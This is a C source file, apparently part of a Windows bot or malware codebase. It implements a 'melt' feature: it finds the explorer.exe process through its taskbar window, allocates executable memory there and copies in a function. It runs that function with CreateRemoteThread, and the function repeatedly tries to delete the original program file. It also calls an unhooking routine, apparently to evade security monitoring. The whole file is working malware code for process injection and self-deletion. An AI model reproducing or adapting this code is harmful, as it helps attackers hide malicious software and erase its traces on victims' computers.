

#ifndef NO_MELT
#include "bt1.h"

//This Function Marks The Memory Address After RemoteThread, Its Used To Count The Size Of RemoteThread
void calcthread(void) 
{
}

//Remote Function
DWORD WINAPI remotethread(INJDATA *rData)
{
	bool b = FALSE;
	while (!b)
	{
		if (rData->fnDeleteFile(rData->lpFileName)) b = TRUE;
			rData->fnSleep(rData->dwMilliseconds);
	}
		return 0;
}

//Inject Melt Code
bool melt()
{
	char szFileName[MAX_PATH];
	DWORD dwBytesWritten, dwPID, dwThreadId, *rRemoteCode; 
	HANDLE hProcess, hThread = NULL;
	INJDATA *rRemoteData;
	int cbCodeSize;

#ifndef NO_DEBUG
		printf("[DEBUG] Hooking melt, melt()...\n");
#endif

#ifndef NO_UNHOOK
		unhook_functions();
#endif

		GetWindowThreadProcessId(FindWindow("shell_traywnd", NULL), &dwPID);
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
	if (hProcess == NULL) return FALSE;
		GetModuleFileName(GetModuleHandle(NULL), szFileName, MAX_PATH);
	INJDATA DataLocal = 
	{
			(DELETEFILE)GetProcAddress(GetModuleHandle(__TEXT("KERNEL32")), "DeleteFileA"),
			(SLEEP)GetProcAddress(GetModuleHandle(__TEXT("KERNEL32")), "Sleep"),
	};
		sprintf(DataLocal.lpFileName, szFileName);
		DataLocal.dwMilliseconds = 500;
		rRemoteData = (INJDATA*)xVirtualAllocEx(hProcess, 0, sizeof(INJDATA), MEM_COMMIT, PAGE_READWRITE);
	if (!rRemoteData) return FALSE;
	if (!WriteProcessMemory(hProcess, rRemoteData, &DataLocal, sizeof(INJDATA), &dwBytesWritten)) return FALSE;
		cbCodeSize = ((LPBYTE)calcthread - (LPBYTE)remotethread);
		rRemoteCode = (PDWORD)xVirtualAllocEx(hProcess, 0, cbCodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);		
	if (!rRemoteCode) return FALSE;
	if (!WriteProcessMemory(hProcess, rRemoteCode, &remotethread, cbCodeSize, &dwBytesWritten)) return FALSE;
		hThread = xCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rRemoteCode, rRemoteData, 0 , &dwThreadId);
	if (!hThread) return FALSE;
		WaitForSingleObject(hThread, 1000);
		xVirtualFreeEx(hProcess, rRemoteData, 0, MEM_RELEASE);
		xVirtualFreeEx(hProcess, rRemoteCode, 0, MEM_RELEASE);
		CloseHandle(hThread);
		CloseHandle(hProcess);
		return TRUE;
}

#endif